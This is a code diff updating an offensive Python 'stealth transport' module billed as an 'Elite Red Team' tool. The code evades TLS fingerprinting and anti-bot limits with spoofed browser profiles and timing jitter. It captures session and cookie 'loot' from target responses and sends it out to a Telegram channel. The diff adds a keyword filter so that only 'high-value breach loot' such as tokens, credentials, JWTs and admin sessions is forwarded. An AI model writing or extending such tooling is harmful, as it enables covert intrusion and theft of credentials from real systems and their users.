@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-TRANSPORT.PY v8.7 — Centralized Stealth HTTP, Adversarial TLS & Behavioral Middleware (Elite Red Team Adversarial Edition)
+TRANSPORT.PY v8.8 — Centralized Stealth HTTP, Adversarial TLS & Behavioral Middleware (Elite Red Team Adversarial Edition)
 Features:
-- Advanced browser fingerprint impersonation (JA3/JA4 evasion via curl_cffi & spoofed SSL contexts)
-- Poisson behavioral timing jitter and randomized browser client hints
-- Robust cookie-jar state synchronization & header rotation with SHA-256 integrity fingerprinting
-- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming
-- Real-time unredacted Telegram notification dispatch and zero-delay telemetry broadcasting
+- Zero-noise filtering: Restricts broadcasts strictly to verified high-value breach loot and critical exploit pivots.
+- Advanced browser fingerprint impersonation (JA3/JA4 evasion via curl_cffi & spoofed SSL contexts).
+- Poisson behavioral timing jitter and randomized browser client hints.
+- Robust cookie-jar state synchronization & header rotation with SHA-256 integrity fingerprinting.
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming.
 """
 import http.client
 import json
@@ -31,9 +31,17 @@ USER_AGENTS = [
     "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
 ]
 
+# Keywords required to pass the zero-noise filter
+HIGH_VALUE_KEYWORDS = [
+    "critical", "bypass", "success", "loot", "token", "session", 
+    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump"
+]
+
 async def broadcast_tg_alert_async(loot_type, details):
     try:
-        await send_telegram_alert(loot_type, details)
+        check_str = f"{loot_type} {str(details)}".lower()
+        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
+            await send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details)
     except Exception:
         pass
 
@@ -61,7 +69,6 @@ class SecureTransport:
         self.base_path = parsed.path.rstrip("/")
         self.cookie_jar = {}
         
-        # Initialize adversarial TLS session manager for advanced fingerprinting
         self.adversarial_tls = AdversarialTLSSession(self.host, browser_profile=browser_profile)
         self.cffi_session = self.adversarial_tls.get_impersonated_session() if CFFI_AVAILABLE else None
 
@@ -86,15 +93,11 @@ class SecureTransport:
         return str(self.cookie_jar)
 
     def request(self, method, path, payload=None, extra_headers=None, retries=3):
-        # Inject randomized human-like velocity jitter to defeat anti-bot limiters
         apply_behavioral_jitter()
 
         endpoint = f"{self.base_path}{path}" if not path.startswith(self.base_path) else path
         full_url = f"{self.target_url.rstrip('/')}{path}" if not path.startswith("http") else path
 
-        # ======================================================
-        # PREFERRED PATH: curl_cffi Adversarial Browser Session
-        # ======================================================
         if self.cffi_session and self.secure:
             headers = {
                 "User-Agent": random.choice(USER_AGENTS),
@@ -135,7 +138,6 @@ class SecureTransport:
                             "response_snippet": data[:300]
                         }
                         
-                        # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                         broadcast_tg_alert_sync("Transport Layer Session Loot", transport_loot)
                         stream_proof("TRANSPORT_SESSION_CAPTURE", full_url, {"method": method, "hash": loot_hash}, data[:300], transport_loot)
                         save_session_loot(
@@ -155,9 +157,6 @@ class SecureTransport:
                         time.sleep(0.4 * (attempt + 1))
                         continue
 
-        # ======================================================
-        # FALLBACK PATH: Low-level http.client with Spoofed SSL
-        # ======================================================
         headers = {
             "Host": self.host,
             "User-Agent": random.choice(USER_AGENTS),
@@ -207,7 +206,6 @@ class SecureTransport:
                         "response_snippet": data[:300]
                     }
                     
-                    # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                     broadcast_tg_alert_sync("Transport Layer Session Loot", transport_loot)
                     stream_proof("TRANSPORT_SESSION_CAPTURE", f"https://{self.host}{endpoint}", {"method": method, "hash": loot_hash}, data[:300], transport_loot)
                     save_session_loot(
